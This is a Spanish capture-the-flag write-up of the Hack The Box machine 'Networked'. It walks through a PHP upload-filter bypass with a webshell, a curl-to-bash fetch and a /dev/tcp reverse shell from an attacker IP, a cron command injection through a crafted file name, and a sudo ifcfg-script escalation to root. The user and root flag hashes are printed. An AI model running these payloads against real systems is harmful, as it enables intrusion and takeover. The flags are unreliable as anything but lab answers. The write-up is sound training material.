---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/203
dificultad: Media
ip: 10.10.10.146
os: Linux
relacionados:
  - "[[Information Leakage]]"
  - "[[PHP Source Code Analysis]]"
  - "[[PHP]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Abusing Cron Job]]"
  - "[[Bash]]"
  - "[[Bash Source Code Analysis]]"
  - "[[Abusing Sudoers Privilege]]"
  - "[[Bypass]]"
---
# HackTheBox - Networked

## Reconocimiento

### Escaneo de Puertos

Para comenzar, realicé un escaneo de puertos en la máquina objetivo `10.10.10.146` para identificar los servicios expuestos. Utilicé `nmap` con un enfoque rápido para detectar todos los puertos TCP abiertos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Recon/allports
nmap -p22,80 -sVC 10.10.11.230
```
Los resultados mostraron dos puertos abiertos:
- **Puerto 22/tcp:** Servicio SSH (OpenSSH 7.4).
- **Puerto 80/tcp:** Servicio HTTP (Apache httpd 2.4.6).
    
### Enumeración Web

Al navegar al sitio web en el puerto 80, me encontré con un mensaje simple, sin mucha información útil a primera vista.

Para descubrir contenido oculto, directorios y archivos, lancé `gobuster`.
```Bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t200 -u http://$(cat ip) -o 00_Recon/dirs
```

El escaneo reveló algunos directorios y archivos de interés:
- `/upload.php`: Una página para subir archivos.
- `/photos.php`: Una galería que muestra los archivos subidos.
- `/backup/`: Un directorio que contenía un archivo `backup.tar`.
    
El archivo `backup.tar` era claramente mi próximo objetivo. Lo descargué para examinar su contenido, esperando encontrar código fuente o credenciales.


---

## Análisis de vulnerabilidades

### Código Fuente de la Aplicación Web

Al extraer el contenido del archivo `backup.tar`, obtuve el código fuente de los ficheros PHP de la aplicación: `upload.php`, `photos.php` y `lib.php`. Esto me permitió realizar un análisis de caja blanca para encontrar vulnerabilidades.

#### Análisis de `upload.php` y `lib.php`

Revisando el código de `upload.php`, encontré la lógica que procesa la subida de archivos. La validación se realiza mediante una función llamada `check_file_type`.
```PHP
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
    echo '<pre>Invalid image file.</pre>';
    displayform();
}
```

La función `check_file_type`, definida en `lib.php`, verifica el tipo MIME del archivo.
```PHP
function check_file_type($file) {
    $mime_type = file_mime_type($file);
    if (strpos($mime_type, 'image/') === 0) {
        return true;
    } else {
        return false;
    }
}
```

A su vez, esta función utiliza `mime_content_type()` para determinar el tipo MIME basándose en los "magic bytes" del archivo.

> [!WARNING] Vulnerabilidad: Bypass de Tipo MIME
> 
> La función mime_content_type() puede ser engañada. Si incluyo los "magic bytes" de un tipo de archivo permitido (como PNG o JPG) al inicio de mi payload malicioso, el servidor lo identificará como una imagen válida, permitiéndome eludir el primer filtro de seguridad.

Adicionalmente, el código verifica la extensión del archivo, pero de una manera insegura.
```PHP
list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
    if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
    }
}
```

> [!WARNING] Vulnerabilidad: Bypass de Extensión
> 
> El script solo comprueba si el nombre del archivo termina en una extensión de imagen válida (.jpg, .png, etc.). No impide el uso de dobles extensiones. Un archivo llamado shell.php.png pasaría esta validación. Si el servidor Apache está configurado para ejecutar archivos con extensión .php sin importar qué otras extensiones le sigan, podré ejecutar código.

Mi plan era claro: crear un archivo PHP con una webshell, añadirle los magic bytes de un PNG al principio y nombrarlo con una doble extensión como `shell.php.png`.

---

## Explotación de vulnerabilidades

### Obtención de Shell como 'apache'

Primero, creé una webshell simple en PHP que me permitiría ejecutar comandos a través de un parámetro en la URL.
```PHP
<?php
    system($_REQUEST['cmd']);
?>
```

Luego, añadí los magic bytes de un archivo PNG (`‰PNG…`) al principio de mi script. El resultado fue un archivo que, aunque contenía una webshell, sería reconocido como una imagen por el backend.

Subí el archivo `shell.php.png` a través de `upload.php`. Como esperaba, la subida fue exitosa.

Luego, navegué a `photos.php` para encontrar mi archivo. Aparecía como una imagen rota, lo cual era una buena señal. Hice clic derecho sobre la imagen rota y seleccioné "Ver imagen" para acceder directamente a la URL del archivo subido.

Una vez en la URL de mi shell (`http://10.10.10.146/uploads/MI_IP.png`), verifiqué que podía ejecutar comandos añadiendo `?cmd=whoami` a la URL. El servidor respondió con `apache`. ¡Tenía ejecución de comandos!

Para obtener una shell interactiva, utilicé `curl` para descargar y ejecutar un script de reverse shell en bash desde mi máquina de atacante.
```Bash
# En mi máquina (atacante)
nc -lvnp 4444

# En el navegador (víctima)
http://10.10.10.146/uploads/MI_IP.png?cmd=curl%2010.10.14.X/shell.sh%20|%20bash
```

Con esto, recibí una conexión en mi listener de `netcat`, dándome una shell como el usuario `apache`.

---

## Escalada de privilegios

### Movimiento Lateral: de 'apache' a 'guly'

Una vez dentro como `apache`, comencé a enumerar el sistema. Al revisar el directorio `/home/`, encontré un usuario llamado `guly`. Dentro de `/home/guly`, descubrí dos archivos interesantes: `check_attack.php` y `crontab.guly`.

El contenido de `crontab.guly` revelaba una tarea programada que se ejecutaba cada 3 minutos:

```
*/3 * * * * php /home/guly/check_attack.php
```

Analicé el script `check_attack.php`. Este script recorre el directorio `/var/www/html/uploads/`, revisa los nombres de los archivos y elimina los que considera maliciosos.
```PHP
// ...
foreach ($files as $key => $value) {
// ...
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
// ...
}
?>
```

> [!DANGER] Vulnerabilidad: Inyección de Comandos en Cronjob
> 
> La variable $value, que contiene el nombre del archivo, se concatena directamente en un comando exec(). No hay ningún tipo de saneamiento sobre el nombre del archivo. Esto significa que puedo crear un archivo en el directorio /var/www/html/uploads/ con un nombre malicioso que contenga un payload de inyección de comandos.

Para explotar esto, creé un archivo vacío en el directorio de subidas cuyo nombre era un comando para establecer una reverse shell.
```Bash
touch '; bash -c "bash -i >& /dev/tcp/10.10.14.X/4445 0>&1" #'
```

El comando rm se convertiría en:

rm -f /var/www/html/uploads/; bash -c "..." #

El punto y coma (`;`) termina el comando `rm`, y el `#` comenta el resto de la línea, asegurando que solo mi payload se ejecute.

Esperé unos minutos a que el cronjob se ejecutara y, efectivamente, recibí una shell como el usuario `guly` en mi segundo listener.

### Escalada a 'root'

Ya como `guly`, el siguiente paso era buscar vectores para escalar a `root`. El primer reflejo fue comprobar los permisos de `sudo`.
```Bash
sudo -l
```

El resultado fue muy prometedor:
```
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

El usuario `guly` puede ejecutar el script `/usr/local/sbin/changename.sh` como `root` y sin necesidad de contraseña. Revisé el contenido del script.
```Bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF
regexp="^[a-zA-Z0-9_\ /-]+$"
for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
    echo "interface $var:"
    read x
    while [[ ! $x =~ $regexp ]]; do
        echo "wrong input, try again"
        echo "interface $var:"
        read x
    done
    echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
/sbin/ifup guly0
```

> [!INFO] Vulnerabilidad: Command Injection en Network Scripts
> 
> En sistemas basados en CentOS/RHEL, los scripts de configuración de red (ifcfg-*) son "sourced" (incluidos y ejecutados en el contexto del shell actual) por el comando ifup. Si podemos escribir en uno de estos archivos, podemos inyectar comandos. El script changename.sh me permite escribir valores en el archivo ifcfg-guly. Aunque hay una regex `(^[a-zA-Z0-9_\ /-]+$)` que valida la entrada, esta permite espacios, lo cual es suficiente para la inyección.

Al ejecutar el script, me pediría varios valores. Para una de las variables, como `NAME`, podía introducir un valor que incluyera un espacio seguido de un comando. Cuando `ifup` procesara la línea `NAME=valor /bin/bash`, interpretaría `/bin/bash` como un comando a ejecutar.

Ejecuté el script con `sudo`:
```Bash
sudo /usr/local/sbin/changename.sh
```

El script me solicitó varios valores. Para los primeros, introduje datos benignos. Cuando me pidió el valor para la variable `PROXY_METHOD`, introduje mi payload:

```
interface NAME:
test
interface PROXY_METHOD:
"anything /bin/bash"
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
```

Al presionar Enter después de la última entrada, el script ejecutó `/sbin/ifup guly0`, que a su vez procesó el archivo de configuración malicioso y me otorgó una shell interactiva como `root`.


---

## Bandera(s)

> [!FLAG] `flag{user}`
> 88c8d29401d7ac4539968be3372d1bf7
^bandera

> [!FLAG] `flag{root}`
> 99cca545f156af67074258a9167c5419
^bandera